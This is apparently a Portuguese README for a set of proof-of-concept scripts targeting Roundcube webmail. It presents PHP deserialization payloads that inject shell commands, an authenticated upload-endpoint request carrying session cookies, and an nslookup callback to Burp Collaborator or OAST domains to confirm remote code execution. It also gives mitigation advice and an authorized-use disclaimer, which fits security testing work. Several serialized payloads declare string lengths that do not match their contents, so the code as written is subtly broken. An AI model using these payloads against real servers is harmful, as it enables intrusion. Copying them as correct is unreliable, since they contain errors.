# Roundcube Payload & RCE Validation Scripts

Repositório com scripts auxiliares para geração de payloads serializados e validação controlada de possível exploração em ambientes Roundcube/Webmail.

A proposta é apoiar testes autorizados de segurança, principalmente em cenários onde há suspeita de desserialização insegura, execução de comandos ou validação de impacto por interação externa controlada, como Burp Collaborator/OAST.

---

## Scripts disponíveis

| Script | Objetivo | Quando usar |
|---|---|---|
| `generate_payload.py` | Gera payload PHP serializado e codificado para uso em URL. | Usar quando for necessário montar manualmente um payload serializado para teste controlado. |
| `roundcube.py` | Versão simples para geração de payload serializado codificado. | Usar como script auxiliar rápido para gerar payload de teste. |
| `roundcube_rce.py` | Envia payload para endpoint autenticado do Roundcube/Webmail e valida possível execução por interação externa. | Usar somente em teste autorizado, com sessão válida e ambiente controlado, quando houver suspeita de RCE/desserialização insegura. |

---

## Visão geral

Os scripts deste repositório estão relacionados à validação de comportamento inseguro em aplicações Roundcube/Webmail, principalmente envolvendo payloads PHP serializados.

O `generate_payload.py` e o `roundcube.py` são scripts simples para gerar payloads codificados em URL.

O `roundcube_rce.py` é mais completo e realiza uma requisição autenticada para um endpoint específico, enviando um payload e orientando a validação por serviço externo de interação, como Burp Collaborator ou OAST.

---

## Diferença entre os scripts

| Script | Tipo | Faz requisição ao alvo? | Cenário |
|---|---|---:|---|
| `generate_payload.py` | Gerador de payload | Não | Preparação manual de payload para teste. |
| `roundcube.py` | Gerador de payload simples | Não | Geração rápida de payload codificado. |
| `roundcube_rce.py` | PoC de validação | Sim | Validação técnica em ambiente autorizado com sessão autenticada. |

---

## 1. generate_payload.py

### Descrição

O `generate_payload.py` gera um payload PHP serializado e aplica URL encode para que ele possa ser utilizado em parâmetros de URL.

O objetivo é facilitar a preparação de payloads em cenários de teste onde a aplicação recebe dados serializados e pode processá-los de forma insegura.

---

### O que o script faz

```text
Define um payload PHP serializado
Codifica o payload para formato URL encoded
Imprime o payload codificado no terminal
```

---

### Campos que devem ser alterados

O principal campo é o payload:

```python
payload = 'O:27:"rcube_washtml_mailto_handler":1:{s:4:"html";s:24:"id > /tmp/poc_test";}'
```

Substitua o comando por algo seguro e não destrutivo.

Exemplo seguro:

```python
payload = 'O:27:"rcube_washtml_mailto_handler":1:{s:4:"html";s:13:"id > /tmp/id";}'
```

Evite comandos destrutivos, persistência, alteração de arquivos sensíveis ou qualquer ação fora do escopo autorizado.

---

### Exemplo de execução

```bash
python3 generate_payload.py
```

---

### Saída esperada

```text
[+] Payload codificado:
O%3A27%3A%22rcube_washtml_mailto_handler%22%3A1%3A%7Bs%3A4%3A%22html%22%3Bs%3A13%3A%22id%20%3E%20%2Ftmp%2Fid%22%3B%7D
```

---

## 2. roundcube.py

### Descrição

O `roundcube.py` é uma versão mais simples do gerador de payload. Ele define um payload PHP serializado e imprime o valor codificado em URL.

Na prática, ele tem a mesma finalidade do `generate_payload.py`, mas com estrutura mais direta e mínima.

---

### O que o script faz

```text
Define um payload serializado
Aplica URL encode
Imprime o payload codificado
```

---

### Campos que devem ser alterados

Altere o payload conforme o cenário autorizado:

```python
payload = 'O:27:"rcube_washtml_mailto_handler":1:{s:4:"html";s:15:"id > /tmp/poc.txt";}'
```

Mantenha comandos seguros e de baixo impacto.

---

### Exemplo de execução

```bash
python3 roundcube.py
```

---

## 3. roundcube_rce.py

### Descrição

O `roundcube_rce.py` é um script de validação técnica que envia um payload para um endpoint autenticado do Roundcube/Webmail.

Ele utiliza cookies de sessão, monta um payload PHP serializado e envia uma requisição `POST` com arquivo dummy para o endpoint configurado. A validação sugerida é feita por interação externa, como Burp Collaborator ou OAST, usando um comando de resolução DNS controlado.

---

### O que o script faz

```text
Define a URL do endpoint alvo
Define cookies de sessão autenticada
Define um comando de validação externa
Monta um payload serializado
Codifica o payload para uso em parâmetro de URL
Envia uma requisição POST com arquivo dummy
Exibe status HTTP e tamanho da resposta
Orienta validação no serviço OAST/Burp Collaborator
```

---

## Campos que devem ser alterados

### URL do alvo

Substitua a URL real pelo endpoint autorizado do teste:

```python
target_url = "https://webmail.exemplo.com.br/program/actions/settings/upload.php"
```
---

### Cookies de sessão

Placeholders:

```python
cookies = {
    "domain_autocompl_webmail": "true",
    "webmailSessionId": "SESSION_ID_AQUI",
    "webmailSessionAuth": "SESSION_AUTH_AQUI",
    "u_domain": "exemplo.com.br"
}
```

---

### Comando de validação

O comando atual usa `nslookup` para validar interação externa

Use um domínio controlado pelo time de teste, como:

```python
cmd = "nslookup seu-identificador.oastify.com"
```

Também pode ser usado Burp Collaborator:

```python
cmd = "nslookup seu-identificador.burpcollaborator.net"
```

---

### Payload

O payload é montado neste trecho:

```python
payload_obj = f'O:13:"rcube_template":1:{{s:15:"parse_container";s:{len(cmd)}:"{cmd}";}}'
```

Esse campo usa o comando definido na variável `cmd`. Para manter o teste seguro, utilize comandos de baixa interação, como resolução DNS controlada.

Evite comandos destrutivos ou que alterem o ambiente.

---

## Exemplo seguro do trecho configurável

```python
target_url = "https://webmail.exemplo.com.br/program/actions/settings/upload.php"

cookies = {
    "domain_autocompl_webmail": "true",
    "webmailSessionId": "SESSION_ID_AQUI",
    "webmailSessionAuth": "SESSION_AUTH_AQUI",
    "u_domain": "exemplo.com.br"
}

cmd = "nslookup seu-identificador.oastify.com"
```

---

## Exemplo de execução

```bash
python3 roundcube_rce.py
```

---

## Saída esperada

```text
[+] Payload enviado para: https://webmail.exemplo.com.br/program/actions/settings/upload.php?_from=PAYLOAD_CODIFICADO
[+] HTTP Status: 200
[+] Tamanho da resposta: 1234
[*] Verifique agora o Burp Collaborator para validar se a requisição foi recebida.
```

---

## Validação esperada

A validação ocorre fora da aplicação, por meio de serviço de interação externa.

Exemplo:

```text
Se o payload for processado e o comando executado, o domínio configurado no nslookup deve receber uma consulta DNS.
```

Isso indica que houve possível execução de comando no servidor.

---

### Dependências Python

Os scripts utilizam bibliotecas nativas e `requests`.

Instale com:

```bash
python3 -m pip install requests
```

---

## Fluxo recomendado de uso

```text
1. Confirmar autorização e escopo do teste
   ↓
2. Identificar versão e endpoint potencialmente afetado
   ↓
3. Gerar payload com generate_payload.py ou roundcube.py
   ↓
4. Validar manualmente a requisição no Burp Suite
   ↓
5. Configurar roundcube_rce.py com URL, cookies e domínio OAST genéricos
   ↓
6. Executar a PoC em ambiente autorizado
   ↓
7. Confirmar interação no Burp Collaborator/OAST
   ↓
8. Registrar evidência sanitizada
```

---

## Limitações

Os scripts `generate_payload.py` e `roundcube.py` apenas geram payloads. Eles não confirmam vulnerabilidade sozinhos.

O `roundcube_rce.py` depende de vários fatores para funcionar corretamente, como:

```text
Sessão autenticada válida
Endpoint acessível
Versão vulnerável ou comportamento inseguro presente
Payload compatível com o contexto da aplicação
Saída externa permitida pelo servidor
DNS/HTTP outbound liberado
```

A ausência de interação no OAST não prova, sozinha, que o ambiente não é vulnerável. Pode haver bloqueio de saída, WAF, validação de sessão, mudança de endpoint ou mitigação parcial.

---

## Mitigação recomendada

Mantenha o Roundcube e seus componentes atualizados para a versão mais recente disponibilizada pelo fornecedor. Restrinja o acesso administrativo, revise endpoints expostos, aplique controles de autenticação robustos, invalide sessões suspeitas e monitore tentativas de exploração envolvendo payloads serializados.

Quando houver suspeita de exploração, revise logs web, logs de autenticação, chamadas externas anômalas, execução de comandos, criação de arquivos temporários e conexões DNS/HTTP incomuns a partir do servidor.

Também é recomendado aplicar hardening no PHP, restringir funções perigosas quando possível, revisar permissões do usuário do serviço web e bloquear saída de rede desnecessária a partir do servidor.

---

## Aviso legal ⚠️

Estes scripts devem ser utilizados apenas em ambientes próprios ou com autorização formal.

A finalidade é apoiar validação técnica, pentest autorizado, análise defensiva e reprodução controlada de achados.

O uso contra sistemas sem autorização é proibido.
